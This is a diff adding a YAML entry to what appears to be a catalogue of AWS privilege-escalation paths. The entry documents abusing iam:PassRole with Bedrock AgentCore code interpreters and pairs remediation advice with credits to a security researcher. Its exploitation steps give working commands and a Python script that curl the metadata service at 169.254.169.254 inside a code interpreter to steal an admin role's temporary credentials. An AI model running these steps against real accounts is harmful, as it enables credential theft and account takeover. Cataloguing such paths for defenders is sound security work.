@@ -1,0 +1,135 @@
+id: bedrock-001
+name: iam:PassRole + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
+category: service-passrole
+services:
+- iam
+- bedrock-agentcore
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: bedrock-agentcore:CreateCodeInterpreter
+    resourceConstraints: Must have permission to create Bedrock AgentCore code interpreters
+  - permission: bedrock-agentcore:StartCodeInterpreterSession
+    resourceConstraints: Must have permission to start sessions with code interpreters
+  - permission: bedrock-agentcore:InvokeCodeInterpreter
+    resourceConstraints: Must have permission to invoke code interpreters
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
+  - permission: bedrock-agentcore:GetCodeInterpreter
+    resourceConstraints: Can be help
+description: A principal with `iam:PassRole`, `bedrock-agentcore:CreateCodeInterpreter`, `bedrock-agentcore:StartCodeInterpreterSession`, and `bedrock-agentcore:InvokeCodeInterpreter` can create and invoke an AWS Bedrock AgentCore code interpreter with a privileged IAM execution role. Code interpreters run on Firecracker MicroVMs and can access the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS. By creating a code interpreter with a privileged role and invoking arbitrary Python code within it, an attacker can retrieve temporary credentials from the metadata service and gain the full permissions of the execution role. This is a novel privilege escalation path specific to AWS's AI/ML tooling.
+prerequisites:
+  admin:
+  - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+  - A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      export AWS_REGION=[your region]
+      export EXECUTION_ROLE=[arn with admin privs]
+      export AWS_ACCESS_KEY_ID = [access key]
+      export AWS_SECRET_ACCESS_KEY = [secret access key]
+      export AWS_SESSION_TOKEN = [session token if applicable]
+      which jq
+    description: Set up current session variables and confirm jq is installed 
+  - step: 2
+    command: |
+      INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \
+        --name privesc \
+        --network-configuration '{"networkMode":"SANDBOX"}' \
+        --execution-role-arn $EXECUTION_ROLE | jq -r .codeInterpreterId)
+    description: Create a code interpreter with the privileged execution role  
+  - step: 3
+    command: |
+      cat << 'EOF' > "get_secrets_from_interpreter.py"
+      import boto3
+      import sys
+      bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
+      CODE_INTERPRETER_ID = sys.argv[1]
+
+      session = bedrock_agentcore_client.start_code_interpreter_session(
+        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+      )
+      session_id = session['sessionId']
+
+      code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'
+
+      response = bedrock_agentcore_client.invoke_code_interpreter(
+        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+        sessionId=session_id,
+        name='executeCommand',
+        arguments={'command': code}
+      )
+
+      for event in response['stream']:
+        if event['result']['structuredContent']['stdout']:
+          print(event['result']['structuredContent']['stdout'])
+      EOF
+    description: Create the python file that will invoke the interpreter
+  - step: 4
+    command: |
+      CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)
+      echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
+      echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")
+      echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")
+    description: Run the python file using the $INTERPRETER_ID to extract credentials
+  - step: 5
+    command: |
+      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
+      export AWS_SESSION_TOKEN=<Token from step 5>
+      aws sts get-caller-identity
+    description: Use the stolen credentials to assume the privileged role's permissions
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege and implement
+  Service Control Policies (SCPs) to prevent unauthorized code interpreter creation.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBedrockRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "bedrock-agentcore.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Use SCPs to deny `bedrock-agentcore:CreateCodeInterpreter` org-wide if not needed
+  - Restrict `bedrock-agentcore:InvokeCodeInterpreter` to specific code interpreters
+  - Follow principle of least privilege for code interpreter execution roles
+  - Ensure execution roles have equal or fewer privileges than invoking users
+  - Enable CloudTrail Data Event logging for code interpreter invocations
+  - Monitor for `CreateCodeInterpreter` and `InvokeCodeInterpreter` events
+  - Alert on code interpreters created with administrative roles
+  - Implement resource tags and condition keys to restrict code interpreter usage
+  - Regularly audit execution roles attached to code interpreters
+discoveredBy:
+  name: Nigel Sood
+  organization: Sonrai Security
+  date: '2025'
+references:
+- title: 'AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling'
+  url: https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/
+- title: 'Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters'
+  url: https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/
+- title: Understanding Credentials Management in Amazon Bedrock AgentCore
+  url: https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html
+relatedPaths:
+- bedrock-002
+- lambda-001
+- ec2-001
+- sagemaker-001
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
